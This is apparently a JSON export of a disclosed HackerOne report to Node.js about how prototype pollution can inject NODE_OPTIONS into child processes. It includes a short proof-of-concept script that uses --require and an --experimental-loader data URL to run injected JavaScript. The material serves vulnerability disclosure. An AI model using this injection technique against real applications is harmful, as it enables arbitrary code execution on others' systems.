{
  "id": 878181,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84NzgxODE=",
  "url": "https://hackerone.com/reports/878181",
  "title": "Child process environment injection via prototype pollution",
  "state": "Closed",
  "substate": "informative",
  "readable_substate": "Informative",
  "created_at": "2020-05-19T17:00:54.691Z",
  "submitted_at": "2020-05-19T17:00:54.691Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "coreyfarrell",
    "url": "/coreyfarrell",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 22984,
    "url": "https://hackerone.com/nodejs",
    "handle": "nodejs",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js",
      "twitter_handle": "nodejs",
      "website": "https://nodejs.org",
      "about": "The Node.js JavaScript Runtime"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2020-07-04T10:06:21.969Z",
  "bug_reporter_agreed_on_going_public_at": "2020-07-04T10:06:21.916Z",
  "team_member_agreed_on_going_public_at": "2020-07-03T17:06:11.641Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** prototype pollution causes polluted system environment for child processes.\n\n**Description:** This can be used to inject arbitrary `--require` flags to node.js child processes or in the case of current node.js versions it can be used to inject arbitrary JavaScript to child processes.\n\nIn practice this would require exploiting an existing prototype pollution vulnerability, https://www.npmjs.com/advisories/1164 for example could allow remote attack if an untrusted handlebars template were processed before spawning child processes.\n\n## Steps To Reproduce:\n\nThe following code demonstrates that prototype injection is reflected in the environment of `child_process` spawns.\n\n```js\n'use strict';\n\nconst {spawnSync} = require('child_process');\n\n// Prototype injection entered directly here for demonstration purposes, normally would be\n// accomplished by exploiting a vulnerable npm module, https://www.npmjs.com/advisories/1164\n// for example.\n({}).__proto__.NODE_OPTIONS = '--require=./malicious-code.js';\n\n// This will execute `./malicious-code.js` before running `subprocess.js`\nconsole.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());\n\n// Current versions of node.js can run arbitrary code without needing the malicious-code.js\n// to be on the destination file system:\n({}).__proto__.NODE_OPTIONS = `--experimental-loader=\"data:text/javascript,console.log('injection');\"`;\n\n// The child process will print `injection` before running subprocess.js\nconsole.log(spawnSync(process.execPath, ['subprocess.js']).stdout.toString());\n```\n\nCreating this script along with a `subprocess.js` and `malicious-code.js` that each perform a `console.log` will demonstrate the effectiveness of this prototype pollution.\n\n## Impact\n\nSuccessful prototype injection on version of node.js which supports `--experimental-loader` can run any JavaScript code in child processes.  Older versions of node.js can only be caused to run arbitrary code that is on the local file system.\n\nThis could also be used as a DoS attack if NODE_OPTIONS were set to `--bad-flag`.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 3,
  "voters": [
    "arif_y",
    "badcracker",
    "sirx9"
  ],
  "structured_scope": {
    "databaseId": 666,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "https://github.com/nodejs/node",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
